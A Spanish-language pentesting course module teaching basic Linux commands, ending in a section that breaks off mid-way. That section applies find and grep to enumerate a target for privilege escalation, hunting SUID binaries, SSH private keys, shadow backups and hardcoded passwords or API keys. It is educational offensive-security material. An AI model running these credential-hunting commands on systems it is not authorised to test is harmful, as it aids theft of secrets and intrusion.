---
title: "Módulo - Comandos Básicos de Linux | Curso Linux Pentesting"
aliases:
  - Módulo - Comandos Básicos de Linux | Curso Linux Pentesting
tags:
  - ifct0109/pocs
  - linux
  - comandos
  - terminal
---

# Módulo - Comandos Básicos de Linux

Dominio de la Línea de Comandos Esencial

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

## 📂 Navegación y Gestión de Directorios

### `pwd` - Print Working Directory

Muestra el **directorio actual** donde estás ubicado.

# Ver directorio actual:
┌──(kali㉿kali)-[~]
└─$ pwd
/home/kali

┌──(kali㉿kali)-[~]
└─$ cd /var/log
┌──(kali㉿kali)-[/var/log]
└─$ pwd
/var/log

### `cd` - Change Directory

Cambia de directorio. El comando más usado en Linux.

# Ir a un directorio específico:
┌──(kali㉿kali)-[~]
└─$ cd /etc
┌──(kali㉿kali)-[/etc]
└─$

# Volver al directorio home:
┌──(kali㉿kali)-[/etc]
└─$ cd
┌──(kali㉿kali)-[~]
└─$

# O también:
┌──(kali㉿kali)-[/etc]
└─$ cd ~
┌──(kali㉿kali)-[~]
└─$

# Subir un nivel (directorio padre):
┌──(kali㉿kali)-[/var/log]
└─$ cd ..
┌──(kali㉿kali)-[/var]
└─$

# Subir dos niveles:
┌──(kali㉿kali)-[/var/log/apache2]
└─$ cd ../..
┌──(kali㉿kali)-[/var]
└─$

# Volver al directorio anterior:
┌──(kali㉿kali)-[/var]
└─$ cd -
/var/log/apache2
┌──(kali㉿kali)-[/var/log/apache2]
└─$

# Rutas relativas vs absolutas:
┌──(kali㉿kali)-[~]
└─$ cd Documents          # Relativa (desde donde estás)
┌──(kali㉿kali)-[~/Documents]
└─$ cd /home/kali/Downloads   # Absoluta (desde la raíz /)

### `ls` - List Directory Contents

Lista archivos y directorios. Uno de los comandos más utilizados.

#### 📋 Uso Básico

# Listar contenido del directorio actual:
┌──(kali㉿kali)-[~]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  Videos

# Listar con detalles (permisos, propietario, tamaño, fecha):
┌──(kali㉿kali)-[~]
└─$ ls -l
drwxr-xr-x 2 kali kali 4096 Feb  8 10:00 Desktop
drwxr-xr-x 2 kali kali 4096 Feb  7 14:30 Documents
-rw-r--r-- 1 kali kali 1234 Feb  8 09:15 archivo.txt

# Listar incluyendo archivos ocultos (empiezan con punto):
┌──(kali㉿kali)-[~]
└─$ ls -la
drwxr-xr-x 15 kali kali 4096 Feb  8 10:00 .
drwxr-xr-x  3 root root 4096 Jan 10 09:00 ..
-rw-------  1 kali kali  256 Feb  8 09:45 .bash_history
-rw-r--r--  1 kali kali  220 Jan 10 09:00 .bashrc
drwxr-xr-x  2 kali kali 4096 Feb  8 10:00 Desktop
-rw-r--r--  1 kali kali 3526 Jan 10 09:00 .zshrc

# Listar con tamaños legibles (human-readable):
┌──(kali㉿kali)-[~]
└─$ ls -lh
-rw-r--r-- 1 kali kali  1.2K Feb  8 09:15 archivo.txt
-rw-r--r-- 1 kali kali   45M Feb  7 11:20 video.mp4
drwxr-xr-x 2 kali kali  4.0K Feb  8 10:00 Desktop

# Ordenar por fecha (más reciente primero):
┌──(kali㉿kali)-[~]
└─$ ls -lt

# Ordenar por tamaño (más grande primero):
┌──(kali㉿kali)-[~]
└─$ ls -lS

# Recursivo (listar subdirectorios también):
┌──(kali㉿kali)-[~]
└─$ ls -R

#### 📊 Opciones Comunes de ls

| Opción | Descripción |
| --- | --- |
| `-l` | Formato largo (detalles: permisos, propietario, tamaño, fecha) |
| `-a` | Mostrar archivos ocultos (. y ..) |
| `-h` | Tamaños human-readable (KB, MB, GB) |
| `-t` | Ordenar por fecha de modificación |
| `-S` | Ordenar por tamaño |
| `-r` | Orden inverso |
| `-R` | Recursivo (listar subdirectorios) |
| `-d` | Listar directorios como archivos (no su contenido) |
| `-i` | Mostrar inodes |

#### 💡 Combinaciones Útiles

# Listar todo con detalles y tamaños legibles:
┌──(kali㉿kali)-[~]
└─$ ls -lah

# Listar solo directorios:
┌──(kali㉿kali)-[~]
└─$ ls -ld */
drwxr-xr-x 2 kali kali 4096 Feb  8 10:00 Desktop/
drwxr-xr-x 2 kali kali 4096 Feb  7 14:30 Documents/
drwxr-xr-x 2 kali kali 4096 Feb  8 09:00 Downloads/

# Listar archivos por extensión:
┌──(kali㉿kali)-[~]
└─$ ls *.txt
archivo.txt  notas.txt  readme.txt

# Contar archivos en directorio:
┌──(kali㉿kali)-[~]
└─$ ls | wc -l
15

### `mkdir` - Make Directory

Crea directorios (carpetas).

# Crear un directorio:
┌──(kali㉿kali)-[~]
└─$ mkdir mi_proyecto
┌──(kali㉿kali)-[~]
└─$ ls -ld mi_proyecto
drwxr-xr-x 2 kali kali 4096 Feb  8 10:30 mi_proyecto

# Crear múltiples directorios:
┌──(kali㉿kali)-[~]
└─$ mkdir dir1 dir2 dir3

# Crear estructura de directorios (padre e hijos):
┌──(kali㉿kali)-[~]
└─$ mkdir -p proyecto/src/main/java
# Crea proyecto, dentro src, dentro main, dentro java

# Crear con permisos específicos:
┌──(kali㉿kali)-[~]
└─$ mkdir -m 700 privado
┌──(kali㉿kali)-[~]
└─$ ls -ld privado
drwx------ 2 kali kali 4096 Feb  8 10:31 privado

### `rmdir` - Remove Directory

Elimina directorios **vacíos**.

# Eliminar directorio vacío:
┌──(kali㉿kali)-[~]
└─$ rmdir dir_vacio

# Si el directorio tiene contenido, falla:
┌──(kali㉿kali)-[~]
└─$ rmdir mi_proyecto
rmdir: failed to remove 'mi_proyecto': Directory not empty

# Para eliminar con contenido, usa rm -r (ver más adelante)

## 📄 Gestión de Archivos

### `touch` - Create Empty File

Crea archivos vacíos o actualiza la fecha de modificación de archivos existentes.

# Crear archivo vacío:
┌──(kali㉿kali)-[~]
└─$ touch archivo.txt
┌──(kali㉿kali)-[~]
└─$ ls -l archivo.txt
-rw-r--r-- 1 kali kali 0 Feb  8 10:35 archivo.txt

# Crear múltiples archivos:
┌──(kali㉿kali)-[~]
└─$ touch file1.txt file2.txt file3.txt

# Crear archivos con patrón:
┌──(kali㉿kali)-[~]
└─$ touch test{1..5}.txt
┌──(kali㉿kali)-[~]
└─$ ls test*.txt
test1.txt  test2.txt  test3.txt  test4.txt  test5.txt

# Actualizar fecha de modificación de archivo existente:
┌──(kali㉿kali)-[~]
└─$ ls -l archivo.txt
-rw-r--r-- 1 kali kali 100 Feb  7 10:00 archivo.txt
┌──(kali㉿kali)-[~]
└─$ touch archivo.txt
┌──(kali㉿kali)-[~]
└─$ ls -l archivo.txt
-rw-r--r-- 1 kali kali 100 Feb  8 10:36 archivo.txt
# Fecha actualizada ↑

### `cp` - Copy Files and Directories

Copia archivos y directorios.

# Copiar archivo:
┌──(kali㉿kali)-[~]
└─$ cp archivo.txt copia.txt

# Copiar archivo a otro directorio:
┌──(kali㉿kali)-[~]
└─$ cp archivo.txt /tmp/

# Copiar con nuevo nombre en otro directorio:
┌──(kali㉿kali)-[~]
└─$ cp archivo.txt /tmp/nuevo_nombre.txt

# Copiar múltiples archivos a un directorio:
┌──(kali㉿kali)-[~]
└─$ cp file1.txt file2.txt file3.txt /tmp/

# Copiar directorio completo (recursivo):
┌──(kali㉿kali)-[~]
└─$ cp -r mi_proyecto /tmp/
# -r = recursive (copia el directorio y todo su contenido)

# Copiar preservando permisos, propietario, timestamps:
┌──(kali㉿kali)-[~]
└─$ cp -p archivo.txt copia.txt

# Copiar solo si el archivo destino es más antiguo:
┌──(kali㉿kali)-[~]
└─$ cp -u origen.txt destino.txt

# Copiar con confirmación (modo interactivo):
┌──(kali㉿kali)-[~]
└─$ cp -i archivo.txt /tmp/
cp: overwrite '/tmp/archivo.txt'? y

# Copiar mostrando lo que hace (verbose):
┌──(kali㉿kali)-[~]
└─$ cp -v archivo.txt /tmp/
'archivo.txt' -> '/tmp/archivo.txt'

#### 📊 Opciones Comunes de cp

| Opción | Descripción |
| --- | --- |
| `-r` / `-R` | Recursivo (copiar directorios) |
| `-p` | Preservar permisos, propietario y timestamps |
| `-i` | Interactivo (preguntar antes de sobrescribir) |
| `-v` | Verbose (mostrar qué está copiando) |
| `-u` | Update (copiar solo si origen es más nuevo) |
| `-a` | Archive (= -dR --preserve=all, copia exacta) |

### `mv` - Move/Rename Files

Mueve archivos/directorios o los renombra.

# Renombrar archivo:
┌──(kali㉿kali)-[~]
└─$ mv archivo_viejo.txt archivo_nuevo.txt

# Mover archivo a otro directorio:
┌──(kali㉿kali)-[~]
└─$ mv archivo.txt /tmp/

# Mover y renombrar a la vez:
┌──(kali㉿kali)-[~]
└─$ mv archivo.txt /tmp/nuevo_nombre.txt

# Mover múltiples archivos:
┌──(kali㉿kali)-[~]
└─$ mv file1.txt file2.txt file3.txt /tmp/

# Mover directorio completo:
┌──(kali㉿kali)-[~]
└─$ mv mi_proyecto /tmp/
# No necesita -r, mv mueve directorios automáticamente

# Renombrar directorio:
┌──(kali㉿kali)-[~]
└─$ mv proyecto_viejo proyecto_nuevo

# Modo interactivo (preguntar antes de sobrescribir):
┌──(kali㉿kali)-[~]
└─$ mv -i archivo.txt /tmp/
mv: overwrite '/tmp/archivo.txt'? y

# Forzar sobrescritura sin preguntar:
┌──(kali㉿kali)-[~]
└─$ mv -f archivo.txt /tmp/

### `rm` - Remove Files

Elimina archivos y directorios. **¡CUIDADO! No hay papelera de reciclaje.**

# Eliminar archivo:
┌──(kali㉿kali)-[~]
└─$ rm archivo.txt

# Eliminar múltiples archivos:
┌──(kali㉿kali)-[~]
└─$ rm file1.txt file2.txt file3.txt

# Eliminar todos los archivos .txt:
┌──(kali㉿kali)-[~]
└─$ rm *.txt

# Eliminar con confirmación (interactivo):
┌──(kali㉿kali)-[~]
└─$ rm -i archivo.txt
rm: remove regular file 'archivo.txt'? y

# Eliminar directorio y todo su contenido (¡PELIGROSO!):
┌──(kali㉿kali)-[~]
└─$ rm -r mi_proyecto/
# -r = recursive

# Forzar eliminación sin preguntar (¡MUY PELIGROSO!):
┌──(kali㉿kali)-[~]
└─$ rm -rf carpeta/
# -f = force (sin confirmación)
# NUNCA ejecutes: rm -rf / (borra TODO el sistema)

# Eliminar mostrando qué borra:
┌──(kali㉿kali)-[~]
└─$ rm -v archivo.txt
removed 'archivo.txt'

> [!warning] ⚠️ ADVERTENCIA - rm es DEFINITIVO
>
>            🔴  rm -rf /  → ¡NUNCA ejecutes esto! Borra TODO el sistema
>            🔴  rm -rf *  en directorio equivocado → Desastre
>            🔴  NO HAY papelera de reciclaje  → Los archivos se pierden permanentemente
>            ✅ Usa `rm -i` para confirmación
>            ✅ Verifica con `ls` antes de `rm -rf`

## 👁️ Visualización de Contenido

### `cat` - Concatenate and Display Files

Muestra el contenido completo de archivos.

# Ver contenido de archivo:
┌──(kali㉿kali)-[~]
└─$ cat archivo.txt
Esta es la línea 1
Esta es la línea 2
Esta es la línea 3

# Ver múltiples archivos:
┌──(kali㉿kali)-[~]
└─$ cat file1.txt file2.txt
# Muestra file1, luego file2

# Concatenar archivos en un nuevo archivo:
┌──(kali㉿kali)-[~]
└─$ cat file1.txt file2.txt > combinado.txt

# Añadir contenido al final de un archivo:
┌──(kali㉿kali)-[~]
└─$ cat file3.txt >> combinado.txt

# Mostrar con números de línea:
┌──(kali㉿kali)-[~]
└─$ cat -n archivo.txt
     1  Esta es la línea 1
     2  Esta es la línea 2
     3  Esta es la línea 3

# Crear archivo desde terminal (Ctrl+D para terminar):
┌──(kali㉿kali)-[~]
└─$ cat > nuevo.txt
Escribes aquí tu texto
Puedes escribir varias líneas
Presiona Ctrl+D para guardar

### `less` / `more` - Paginadores

Visualizan archivos página por página (útil para archivos grandes).

# Ver archivo con less (recomendado):
┌──(kali㉿kali)-[~]
└─$ less archivo_grande.txt
# Controles:
# Espacio = siguiente página
# b = página anterior
# q = salir
# /texto = buscar "texto"
# n = siguiente resultado de búsqueda
# G = ir al final
# g = ir al inicio

# Ver archivo con more (más antiguo, menos funciones):
┌──(kali㉿kali)-[~]
└─$ more archivo.txt

# Ver logs en tiempo real:
┌──(kali㉿kali)-[~]
└─$ less +F /var/log/syslog
# +F = follow mode (como tail -f)

### `head` / `tail` - Mostrar Inicio/Final

Muestran las primeras o últimas líneas de un archivo.

# Ver primeras 10 líneas (por defecto):
┌──(kali㉿kali)-[~]
└─$ head archivo.txt

# Ver primeras 20 líneas:
┌──(kali㉿kali)-[~]
└─$ head -n 20 archivo.txt
# O abreviado:
┌──(kali㉿kali)-[~]
└─$ head -20 archivo.txt

# Ver últimas 10 líneas:
┌──(kali㉿kali)-[~]
└─$ tail archivo.txt

# Ver últimas 50 líneas:
┌──(kali㉿kali)-[~]
└─$ tail -n 50 archivo.txt

# Seguir un archivo en tiempo real (logs):
┌──(kali㉿kali)-[~]
└─$ tail -f /var/log/syslog
# Muestra nuevas líneas a medida que se añaden
# Ctrl+C para salir

# Combinar head y tail (ver líneas del medio):
┌──(kali㉿kali)-[~]
└─$ head -30 archivo.txt | tail -10
# Muestra líneas 21-30

### `wc` - Word Count

Cuenta líneas, palabras y caracteres.

# Contar líneas, palabras y caracteres:
┌──(kali㉿kali)-[~]
└─$ wc archivo.txt
  150  1200  8500 archivo.txt
# 150 líneas, 1200 palabras, 8500 caracteres

# Contar solo líneas:
┌──(kali㉿kali)-[~]
└─$ wc -l archivo.txt
150 archivo.txt

# Contar solo palabras:
┌──(kali㉿kali)-[~]
└─$ wc -w archivo.txt
1200 archivo.txt

# Contar archivos en directorio:
┌──(kali㉿kali)-[~]
└─$ ls | wc -l
25

# Contar usuarios del sistema:
┌──(kali㉿kali)-[~]
└─$ cat /etc/passwd | wc -l
42

## 🔍 Búsqueda de Archivos y Contenido

### `find` - Buscar Archivos y Directorios

El comando más potente para buscar archivos en el sistema.

#### 🔎 Búsqueda Básica

# Buscar archivo por nombre en directorio actual:
┌──(kali㉿kali)-[~]
└─$ find . -name "archivo.txt"
./Documents/archivo.txt

# Buscar en todo el sistema:
┌──(kali㉿kali)-[~]
└─$ find / -name "archivo.txt" 2>/dev/null
# 2>/dev/null descarta errores de permisos

# Buscar sin distinguir mayúsculas/minúsculas:
┌──(kali㉿kali)-[~]
└─$ find . -iname "archivo.txt"
# Encuentra: archivo.txt, Archivo.TXT, ARCHIVO.txt, etc.

# Buscar con comodines:
┌──(kali㉿kali)-[~]
└─$ find . -name "*.txt"
./notas.txt
./Documents/proyecto.txt
./Downloads/readme.txt

# Buscar solo archivos (no directorios):
┌──(kali㉿kali)-[~]
└─$ find . -type f -name "*.txt"

# Buscar solo directorios:
┌──(kali㉿kali)-[~]
└─$ find . -type d -name "proyecto"

#### 📅 Búsqueda por Tiempo

# Archivos modificados en últimas 24 horas:
┌──(kali㉿kali)-[~]
└─$ find . -mtime -1

# Archivos modificados hace más de 7 días:
┌──(kali㉿kali)-[~]
└─$ find . -mtime +7

# Archivos modificados hace exactamente 3 días:
┌──(kali㉿kali)-[~]
└─$ find . -mtime 3

# Archivos modificados en últimos 60 minutos:
┌──(kali㉿kali)-[~]
└─$ find . -mmin -60

# Archivos accedidos hoy:
┌──(kali㉿kali)-[~]
└─$ find . -atime 0

#### 📏 Búsqueda por Tamaño

# Archivos mayores a 100MB:
┌──(kali㉿kali)-[~]
└─$ find . -size +100M

# Archivos menores a 1KB:
┌──(kali㉿kali)-[~]
└─$ find . -size -1k

# Archivos vacíos (0 bytes):
┌──(kali㉿kali)-[~]
└─$ find . -size 0

# Archivos entre 10MB y 50MB:
┌──(kali㉿kali)-[~]
└─$ find . -size +10M -size -50M

#### 🔐 Búsqueda por Permisos

# Archivos con permiso 777:
┌──(kali㉿kali)-[~]
└─$ find . -perm 777

# Archivos con SUID:
┌──(kali㉿kali)-[~]
└─$ find / -perm -4000 -type f 2>/dev/null

# Archivos escribibles por todos:
┌──(kali㉿kali)-[~]
└─$ find / -perm -002 -type f 2>/dev/null

#### ⚡ Ejecutar Comandos con find

# Eliminar todos los .tmp:
┌──(kali㉿kali)-[~]
└─$ find . -name "*.tmp" -delete

# Ejecutar comando en cada archivo encontrado:
┌──(kali㉿kali)-[~]
└─$ find . -name "*.txt" -exec cat {} \;
# {} se reemplaza por cada archivo encontrado

# Copiar archivos encontrados:
┌──(kali㉿kali)-[~]
└─$ find . -name "*.log" -exec cp {} /tmp/ \;

# Con confirmación:
┌──(kali㉿kali)-[~]
└─$ find . -name "*.old" -ok rm {} \;
 ? y

### `locate` - Búsqueda Rápida

Busca archivos en una base de datos (mucho más rápido que find).

# Buscar archivo:
┌──(kali㉿kali)-[~]
└─$ locate archivo.txt
/home/kali/Documents/archivo.txt
/var/backups/archivo.txt

# Buscar ignorando mayúsculas:
┌──(kali㉿kali)-[~]
└─$ locate -i archivo

# Actualizar base de datos (requiere sudo):
┌──(kali㉿kali)-[~]
└─$ sudo updatedb

# Contar resultados:
┌──(kali㉿kali)-[~]
└─$ locate -c archivo.txt
2

> [!warning] 💡 find vs locate
>
>             locate : Muy rápido, busca en base de datos (updatedb), puede no estar actualizado
>             find : Más lento, busca en tiempo real, siempre actualizado, más opciones

### `grep` - Buscar Dentro de Archivos

Busca patrones de texto **dentro** del contenido de archivos.

#### 🔎 Uso Básico

# Buscar texto en archivo:
┌──(kali㉿kali)-[~]
└─$ grep "password" archivo.txt
La contraseña es: password123

# Buscar ignorando mayúsculas/minúsculas:
┌──(kali㉿kali)-[~]
└─$ grep -i "password" archivo.txt
# Encuentra: password, PASSWORD, Password, etc.

# Mostrar número de línea:
┌──(kali㉿kali)-[~]
└─$ grep -n "error" log.txt
15:Error: File not found
42:Error: Connection timeout

# Contar coincidencias:
┌──(kali㉿kali)-[~]
└─$ grep -c "error" log.txt
2

# Buscar recursivamente en directorio:
┌──(kali㉿kali)-[~]
└─$ grep -r "password" /etc/
/etc/config/database.conf:password=secret123

# Invertir búsqueda (líneas que NO contienen):
┌──(kali㉿kali)-[~]
└─$ grep -v "comentario" archivo.txt
# Muestra líneas que NO tienen "comentario"

# Mostrar contexto (líneas antes y después):
┌──(kali㉿kali)-[~]
└─$ grep -A 2 -B 2 "error" log.txt
# -A 2 = 2 líneas después
# -B 2 = 2 líneas antes

#### 🎯 Expresiones Regulares

# Buscar líneas que empiezan con "Error":
┌──(kali㉿kali)-[~]
└─$ grep "^Error" log.txt

# Buscar líneas que terminan con ".txt":
┌──(kali㉿kali)-[~]
└─$ grep "\.txt$" archivo.txt

# Buscar IPs (patrón simple):
┌──(kali㉿kali)-[~]
└─$ grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" log.txt
192.168.1.100
10.0.0.1

# Buscar múltiples patrones:
┌──(kali㉿kali)-[~]
└─$ grep -E "error|warning|fail" log.txt

#### 💡 Combinaciones Útiles

# Ver procesos de un usuario:
┌──(kali㉿kali)-[~]
└─$ ps aux | grep kali

# Buscar puertos abiertos:
┌──(kali㉿kali)-[~]
└─$ netstat -tuln | grep LISTEN

# Filtrar logs de SSH:
┌──(kali㉿kali)-[~]
└─$ cat /var/log/auth.log | grep ssh

## 🗜️ Compresión y Archivado

### `tar` - Tape Archive

Crea y extrae archivos comprimidos (.tar, .tar.gz, .tar.bz2).

#### 📦 Crear Archivos

# Crear archivo .tar (sin comprimir):
┌──(kali㉿kali)-[~]
└─$ tar -cvf archivo.tar directorio/
# -c = create (crear)
# -v = verbose (mostrar progreso)
# -f = file (especificar nombre)

# Crear .tar.gz (comprimido con gzip):
┌──(kali㉿kali)-[~]
└─$ tar -czvf archivo.tar.gz directorio/
# -z = gzip compression

# Crear .tar.bz2 (mejor compresión, más lento):
┌──(kali㉿kali)-[~]
└─$ tar -cjvf archivo.tar.bz2 directorio/
# -j = bzip2 compression

# Comprimir múltiples archivos/directorios:
┌──(kali㉿kali)-[~]
└─$ tar -czvf backup.tar.gz file1.txt dir1/ file2.txt

#### 📂 Extraer Archivos

# Extraer .tar:
┌──(kali㉿kali)-[~]
└─$ tar -xvf archivo.tar
# -x = extract

# Extraer .tar.gz:
┌──(kali㉿kali)-[~]
└─$ tar -xzvf archivo.tar.gz

# Extraer .tar.bz2:
┌──(kali㉿kali)-[~]
└─$ tar -xjvf archivo.tar.bz2

# Extraer en directorio específico:
┌──(kali㉿kali)-[~]
└─$ tar -xzvf archivo.tar.gz -C /tmp/

# Ver contenido sin extraer:
┌──(kali㉿kali)-[~]
└─$ tar -tzvf archivo.tar.gz
# -t = list (listar contenido)

### `gzip` / `gunzip` - Comprimir Archivos

Comprimir/descomprimir archivos individuales (.gz).

# Comprimir archivo (reemplaza el original):
┌──(kali㉿kali)-[~]
└─$ gzip archivo.txt
# Crea archivo.txt.gz y elimina archivo.txt

# Comprimir manteniendo original:
┌──(kali㉿kali)-[~]
└─$ gzip -k archivo.txt
# -k = keep (mantener original)

# Descomprimir:
┌──(kali㉿kali)-[~]
└─$ gunzip archivo.txt.gz
# O también:
┌──(kali㉿kali)-[~]
└─$ gzip -d archivo.txt.gz

### `zip` / `unzip` - Archivos ZIP

Compatibilidad con formato ZIP (Windows-friendly).

# Crear archivo ZIP:
┌──(kali㉿kali)-[~]
└─$ zip archivo.zip file1.txt file2.txt

# Comprimir directorio recursivamente:
┌──(kali㉿kali)-[~]
└─$ zip -r proyecto.zip proyecto/

# Descomprimir:
┌──(kali㉿kali)-[~]
└─$ unzip archivo.zip

# Descomprimir en directorio específico:
┌──(kali㉿kali)-[~]
└─$ unzip archivo.zip -d /tmp/

# Listar contenido sin extraer:
┌──(kali㉿kali)-[~]
└─$ unzip -l archivo.zip

## 📦 Gestión de Paquetes (apt)

### `apt` - Advanced Package Tool

Gestor de paquetes de Debian, Ubuntu y Kali Linux.

#### 🔄 Actualizar Sistema

# Actualizar lista de paquetes disponibles:
┌──(kali㉿kali)-[~]
└─$ sudo apt update
Hit:1 http://kali.download/kali kali-rolling InRelease
Reading package lists... Done
Building dependency tree... Done

# Actualizar paquetes instalados:
┌──(kali㉿kali)-[~]
└─$ sudo apt upgrade

# Actualizar TODO (incluye distribución):
┌──(kali㉿kali)-[~]
└─$ sudo apt full-upgrade

# Hacer ambas cosas en un comando:
┌──(kali㉿kali)-[~]
└─$ sudo apt update && sudo apt upgrade -y
# -y = auto-confirmar

#### 📥 Instalar Paquetes

# Instalar paquete:
┌──(kali㉿kali)-[~]
└─$ sudo apt install nmap
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  nmap
Do you want to continue? [Y/n] y

# Instalar sin confirmación:
┌──(kali㉿kali)-[~]
└─$ sudo apt install nmap -y

# Instalar múltiples paquetes:
┌──(kali㉿kali)-[~]
└─$ sudo apt install nmap sqlmap nikto

# Reinstalar paquete:
┌──(kali㉿kali)-[~]
└─$ sudo apt reinstall nmap

#### 🗑️ Eliminar Paquetes

# Eliminar paquete (mantiene archivos de configuración):
┌──(kali㉿kali)-[~]
└─$ sudo apt remove nmap

# Eliminar completamente (incluye configuración):
┌──(kali㉿kali)-[~]
└─$ sudo apt purge nmap

# Eliminar paquetes huérfanos (ya no necesarios):
┌──(kali㉿kali)-[~]
└─$ sudo apt autoremove

# Limpiar caché de paquetes:
┌──(kali㉿kali)-[~]
└─$ sudo apt clean
┌──(kali㉿kali)-[~]
└─$ sudo apt autoclean

#### 🔍 Buscar e Información

# Buscar paquete:
┌──(kali㉿kali)-[~]
└─$ apt search nmap
nmap/kali-rolling 7.94+dfsg1-1 amd64
  The Network Mapper

# Ver información detallada:
┌──(kali㉿kali)-[~]
└─$ apt show nmap
Package: nmap
Version: 7.94+dfsg1-1
Description: The Network Mapper
...

# Ver paquetes instalados:
┌──(kali㉿kali)-[~]
└─$ apt list --installed

# Ver si un paquete está instalado:
┌──(kali㉿kali)-[~]
└─$ dpkg -l | grep nmap

## ⚙️ Comandos del Sistema

### `ps` - Process Status

Muestra procesos en ejecución.

# Ver procesos del usuario actual:
┌──(kali㉿kali)-[~]
└─$ ps
  PID TTY          TIME CMD
 1234 pts/0    00:00:00 zsh
 1256 pts/0    00:00:00 ps

# Ver TODOS los procesos (estilo BSD):
┌──(kali㉿kali)-[~]
└─$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168644 11616 ?        Ss   08:20   0:01 /sbin/init
kali      1234  0.0  0.2  23456  5432 pts/0    Ss   10:30   0:00 /usr/bin/zsh
...

# Ver procesos en formato jerárquico:
┌──(kali㉿kali)-[~]
└─$ ps auxf
# O mejor aún:
┌──(kali㉿kali)-[~]
└─$ pstree

# Ver procesos de un usuario:
┌──(kali㉿kali)-[~]
└─$ ps -u kali

### `top` / `htop` - Monitor de Procesos

Monitoreo en tiempo real de procesos y recursos.

# Ver procesos en tiempo real:
┌──(kali㉿kali)-[~]
└─$ top
# Controles:
# q = salir
# k = matar proceso (kill)
# M = ordenar por memoria
# P = ordenar por CPU
# u = filtrar por usuario

# htop (más visual, recomendado):
┌──(kali㉿kali)-[~]
└─$ htop
# Si no está instalado:
# sudo apt install htop

### `kill` / `killall` - Terminar Procesos

Envía señales a procesos (normalmente para terminarlos).

# Matar proceso por PID:
┌──(kali㉿kali)-[~]
└─$ kill 1234

# Forzar terminación (SIGKILL):
┌──(kali㉿kali)-[~]
└─$ kill -9 1234

# Matar proceso por nombre:
┌──(kali㉿kali)-[~]
└─$ killall firefox

# Señales comunes:
# -1 (SIGHUP)  = Recargar configuración
# -9 (SIGKILL) = Matar forzosamente
# -15 (SIGTERM) = Terminar gracefully (por defecto)

### `systemctl` - Gestión de Servicios

Controla servicios del sistema (systemd).

# Ver estado de un servicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled)
     Active: active (running) since Sun 2025-02-08 08:20:15 CET

# Iniciar servicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start ssh

# Detener servicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl stop ssh

# Reiniciar servicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl restart ssh

# Habilitar al inicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl enable ssh

# Deshabilitar al inicio:
┌──(kali㉿kali)-[~]
└─$ sudo systemctl disable ssh

# Ver todos los servicios:
┌──(kali㉿kali)-[~]
└─$ systemctl list-units --type=service

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

Técnicas avanzadas con comandos básicos para reconocimiento y explotación

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Técnicas de Pentesting con Comandos Básicos

      🔍 Uso de find para Escalada de Privilegios

#### Vector de Ataque: Enumeración con find

El comando `find` es una de las herramientas más poderosas para enumerar el sistema y encontrar vectores de escalada.

#### 🎯 Buscar Binarios SUID/SGID

# Buscar binarios SUID (se ejecutan como propietario):
usuario@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/opt/custom/backup_tool  ← ¡Potencialmente explotable!

# Buscar binarios SGID:
usuario@target:~$ find / -perm -2000 -type f 2>/dev/null

# Buscar ambos (SUID o SGID):
usuario@target:~$ find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

#### 📂 Archivos Escribibles

# Archivos escribibles por todos:
usuario@target:~$ find / -perm -002 -type f 2>/dev/null
/var/www/html/config.php  ← ¡Puedes modificarlo!
/etc/cron.d/backup.sh

# Directorios escribibles:
usuario@target:~$ find / -perm -002 -type d 2>/dev/null

# Archivos del usuario root escribibles por ti:
usuario@target:~$ find / -user root -writable -type f 2>/dev/null

#### 🔐 Archivos con Credenciales

# Buscar archivos de configuración:
usuario@target:~$ find /home /var/www -name "*.conf" -o -name "config.*" 2>/dev/null

# Buscar archivos con "password" en el nombre:
usuario@target:~$ find / -name "*password*" 2>/dev/null
/home/admin/.backup/passwords.txt

# Buscar claves SSH:
usuario@target:~$ find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
/home/admin/.ssh/id_rsa  ← ¡Clave privada!

# Archivos modificados recientemente (últimas 24h):
usuario@target:~$ find /etc /home -mtime -1 -type f 2>/dev/null

#### 💾 Archivos de Backups

# Buscar backups:
usuario@target:~$ find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
/var/backups/shadow.bak  ← ¡Potencialmente con hashes de passwords!

      🔎 Uso de grep para Extraer Información Sensible

#### Vector de Ataque: Búsqueda de Información con grep

Usar `grep` para extraer credenciales, IPs, rutas y otra información crítica de archivos y logs.

#### 🔑 Buscar Credenciales

# Buscar "password" en todo el sistema:
usuario@target:~$ grep -r "password" /home /var/www /etc 2>/dev/null
/var/www/html/config.php:$db_password = "SuperSecret123";

# Buscar múltiples términos relacionados con credenciales:
usuario@target:~$ grep -riE "password|passwd|pwd|pass|secret|key" /var/www 2>/dev/null

# Buscar en archivos de configuración:
usuario@target:~$ grep -r "password" /etc/*.conf 2>/dev/null

# Buscar API keys:
usuario@target:~$ grep -riE "api_key|apikey|api-key|token" /var/www 2>/dev/null

#### 🌐 Extraer IPs y Dominios

# Buscar direcciones IP:
usuario@target:~$ grep -roE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /var/log 2>/dev/null | sort -u
192.168.1.100
10.0.0.1
172.16.5.50

# Extraer emails:
usuario@target:~$ grep -roE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" /var/www 2>/dev/null

# Extraer URLs:
usuario@target:~$ grep -roE "https?://[^\s]+" /var/www 2>/dev/null

#### 📜 Analizar Logs

# Intentos fallidos de SSH:
usuario@target:~$ grep "Failed password" /var/log/auth.log
Feb  8 10:35:21 target sshd[1234]: Failed password for admin from 192.168.1.50

# Logins exitosos:
